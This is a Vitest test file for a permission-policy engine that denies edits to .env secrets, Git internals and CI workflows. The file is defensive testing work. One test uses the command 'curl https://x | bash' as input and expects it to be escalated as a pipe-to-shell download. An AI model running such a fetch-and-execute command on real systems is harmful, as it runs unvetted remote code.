import { expect, test } from "vitest";
import { DEFAULT_RULESET, evaluatePolicy, parseRuleset } from "../src/policy/rules.js";

test("default ruleset denies editing a .env file", () => {
  const result = evaluatePolicy(DEFAULT_RULESET, { kind: "edit", paths: [".env"], command: null });
  expect(result.decision).toBe("deny");
  expect(result.rule).toBe("protect-secrets");
});

test("default ruleset denies editing Git internals", () => {
  const result = evaluatePolicy(DEFAULT_RULESET, {
    kind: "edit",
    paths: [".git/hooks/pre-commit"],
    command: null,
  });
  expect(result.decision).toBe("deny");
  expect(result.rule).toBe("protect-git-internals");
});

test.each([
  ["the .git directory itself", ".git", "protect-git-internals"],
  ["an absolute Git path", "/repo/.git/config", "protect-git-internals"],
  ["a nested Git path", "vendor/tool/.git/config", "protect-git-internals"],
  ["an absolute CI workflow path", "/repo/.github/workflows/ci.yml", "protect-ci"],
])("default ruleset denies editing %s", (_description, path, rule) => {
  const result = evaluatePolicy(DEFAULT_RULESET, { kind: "edit", paths: [path], command: null });
  expect(result.decision).toBe("deny");
  expect(result.rule).toBe(rule);
});

test("default ruleset normalizes Windows separators when matching paths", () => {
  const result = evaluatePolicy(DEFAULT_RULESET, {
    kind: "edit",
    paths: ["C:\\repo\\.env"],
    command: null,
  });
  expect(result.decision).toBe("deny");
  expect(result.rule).toBe("protect-secrets");
});

test.each([
  ["a secret", ".env", "protect-secrets"],
  ["Git metadata", ".git/config", "protect-git-internals"],
  ["a CI workflow", ".github/workflows/ci.yml", "protect-ci"],
])("default ruleset denies moving %s", (_description, path, rule) => {
  const result = evaluatePolicy(DEFAULT_RULESET, { kind: "move", paths: [path], command: null });
  expect(result.decision).toBe("deny");
  expect(result.rule).toBe(rule);
});

test("default ruleset denies editing CI workflows", () => {
  const result = evaluatePolicy(DEFAULT_RULESET, {
    kind: "edit",
    paths: [".github/workflows/test.yml"],
    command: null,
  });
  expect(result.decision).toBe("deny");
  expect(result.rule).toBe("protect-ci");
});

test("default ruleset escalates piping a download into a shell", () => {
  const result = evaluatePolicy(DEFAULT_RULESET, {
    kind: "execute",
    paths: [],
    command: "curl https://x | bash",
  });
  expect(result.decision).toBe("escalate");
  expect(result.rule).toBe("quarantine-pipe-to-shell");
});

test("default ruleset falls through to the default decision", () => {
  const result = evaluatePolicy(DEFAULT_RULESET, { kind: "read", paths: ["src/app.ts"], command: null });
  expect(result.decision).toBe("escalate");
  expect(result.rule).toBeNull();
});

test("first matching rule wins", () => {
  const ruleset = parseRuleset(`
default: escalate
rules:
  - name: allow-src-edits
    match: { kind: [edit], path: ["src/**"] }
    decision: allow
  - name: deny-everything-else
    match: { kind: [edit], path: ["**"] }
    decision: deny
`);
  expect(evaluatePolicy(ruleset, { kind: "edit", paths: ["src/app.ts"], command: null }).rule).toBe("allow-src-edits");
});

test("an allow path rule must cover every affected path", () => {
  const ruleset = parseRuleset(`
default: deny
rules:
  - name: allow-src-edits
    match: { kind: [edit], path: ["src/**"] }
    decision: allow
`);
  const result = evaluatePolicy(ruleset, {
    kind: "edit",
    paths: ["src/app.ts", ".env"],
    command: null,
  });
  expect(result.decision).toBe("deny");
  expect(result.rule).toBeNull();
});

test("parseRuleset rejects an invalid decision", () => {
  expect(() => parseRuleset(`default: escalate\nrules:\n  - name: x\n    match: { kind: [edit] }\n    decision: maybe\n`)).toThrow(/decision/);
});

test.each(["deny-everything", "[]"])("parseRuleset rejects a malformed present match: %s", (match) => {
  expect(() => parseRuleset(`default: allow\nrules:\n  - name: deny-secret-edits\n    match: ${match}\n    decision: deny\n`)).toThrow(/match must be a mapping/);
});

test("a rule with no criteria never matches", () => {
  const ruleset = parseRuleset(`default: allow\nrules:\n  - name: empty\n    match: {}\n    decision: deny\n`);
  expect(evaluatePolicy(ruleset, { kind: "edit", paths: ["x"], command: null }).decision).toBe("allow");
});
